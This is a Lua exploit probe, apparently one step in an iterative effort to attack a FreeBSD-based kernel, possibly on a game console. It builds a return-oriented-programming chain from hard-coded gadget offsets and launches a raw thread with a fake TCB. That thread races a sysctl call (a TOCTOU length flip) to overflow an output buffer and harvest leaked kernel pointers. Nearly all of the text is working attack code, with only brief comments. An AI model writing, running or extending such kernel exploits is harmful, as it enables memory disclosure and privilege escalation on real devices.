-- CRASH_CLASS: MODERATE
-- PROBE 393g: sysctl TOCTOU race — param via wd, chain via wq
--
-- 393f showed: chain building with wq works, but param struct wq
-- corrupts stdout. Also no output after thr_new. Fix both:
-- 1. Build param struct with wd (dword pairs)
-- 2. Flush-test after thr_new with small delay

print("=== PROBE 393g: sysctl TOCTOU ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

-- Write 64-bit as two dwords
local function w64(addr, lo, hi)
    wd(addr, lo or 0)
    wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end

-- fn_addr as lo/hi for wd usage
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_val = tonumber(fn_str)
local fn_lo = fn_val % 0x100000000
local fn_hi = math.floor(fn_val / 0x100000000)

-- Gadget lo/hi for param struct
local function g_lohi(off)
    local lo = eb_lo + off
    local hi = eb_hi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Shared race mem
local shared = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(shared) + i, 0) end
local oldlenp_a = N(shared)
local flag_a = N(shared) + 0x10
wd(flag_a, 1)
wd(oldlenp_a, 0x448)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(fake_tcb, fake_tcb)
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, fake_tcb)

-- Stack
local SSIZE = 0x4000
local stk = memory.alloc(SSIZE)
for i = 0, SSIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local rsp = stk_base + SSIZE - 8
rsp = rsp - (rsp % 16)

-- Build chain: wq + uint64 (works per 393f)
local sp = rsp

local function push(val)
    wq(sp, val)
    sp = sp + 8
end

-- sysarch(165, 129, &tcb_ptr)
push(uint64(165))
push(g(0xC9DFE))        -- pop_rdi
push(uint64(129))
push(g(0xD77D))          -- pop_rsi
push(uint64(N(tcb_ptr)))
push(g(0x3B02D7))        -- pop_rdx
push(uint64(0))
push(g(0xE64))           -- pop_rcx
push(uint64(0))
push(stub)               -- fn_addr

-- 10 flip iterations (enough for 50 race rounds)
for i = 1, 10 do
    push(g(0xC9DFE))     -- pop_rdi
    push(uint64(oldlenp_a))
    push(g(0x992))        -- pop_rax
    push(uint64(0x2000))  -- large
    push(g(0x92C67))      -- mov [rdi],rax

    push(g(0xC9DFE))
    push(uint64(oldlenp_a))
    push(g(0x992))
    push(uint64(0x448))   -- small
    push(g(0x92C67))
end

-- Signal done
push(g(0xC9DFE))
push(uint64(flag_a))
push(g(0x992))
push(uint64(0))
push(g(0x92C67))

-- thr_exit(431)
push(g(0x992))
push(uint64(431))
push(g(0xC9DFE))
push(uint64(0))
push(stub)

local cq = (sp - rsp) / 8
print(string.format("chain=%d rsp=%X", cq, rsp))

-- thr_param — ALL via wd (no wq!)
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
-- start_func = pop_rax_ret
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
-- arg = 0
w64(N(pa) + 8, 0, 0)
-- stack_base
w64(N(pa) + 0x10, stk_base % 0x100000000, math.floor(stk_base / 0x100000000))
-- stack_size
w64(N(pa) + 0x18, SSIZE, 0)
-- tls_base, tls_size, child_tid, parent_tid, flags, rtp = 0
-- child_tid at +0x30
local ctid = memory.alloc(8)
for i = 0, 4, 4 do wd(N(ctid) + i, 0) end
local ctid_a = N(ctid)
w64(N(pa) + 0x30, ctid_a % 0x100000000, math.floor(ctid_a / 0x100000000))

print("param built")

-- Launch child
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))

if tret ~= 0 then print("FAIL"); return end
if not alive() then print("DEAD"); return end

-- Race
print("race")
local mib = memory.alloc(16)
wd(N(mib), 1)
wd(N(mib) + 4, 14)
wd(N(mib) + 8, 1)
wd(N(mib) + 12, pid_val)
local outbuf = memory.alloc(0x2000)
local sc = mk(202)

local over = 0
local kptr = 0
local ok_rounds = 0

for r = 1, 50 do
    if not alive() then break end
    for i = 0, 0x1FFC, 4 do wd(N(outbuf) + i, 0xDEADDEAD) end
    wd(oldlenp_a, 0x448)

    local ok_s, rv_s = pcall(function()
        return sc(uint64(N(mib)), uint64(4), outbuf,
            uint64(oldlenp_a), uint64(0), uint64(0))
    end)
    if ok_s and N(rv_s) == 0 then
        ok_rounds = ok_rounds + 1
        local past = false
        for off = 0x448, 0x460, 4 do
            local d = rd(N(outbuf) + off)
            if d and d ~= 0xDEADDEAD then past = true; break end
        end
        if past then
            over = over + 1
            for off = 0x448, 0x1FF0, 8 do
                local lo_v = rd(N(outbuf) + off)
                local hi_v = rd(N(outbuf) + off + 4)
                if hi_v and hi_v >= 0xFFFF8000 and hi_v < 0xFFFFFFFF then
                    kptr = kptr + 1
                    if kptr <= 5 then
                        print(string.format("KPTR r%d +%03X %08X_%08X",
                            r, off, hi_v, lo_v or 0))
                    end
                end
            end
            if over <= 3 then
                print(string.format("OVER r%d", r))
            end
        end
    end
end

local done = rd(flag_a) == 0
print(string.format("ok=%d over=%d kptr=%d done=%s",
    ok_rounds, over, kptr, done and "y" or "n"))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 393g COMPLETE ===")
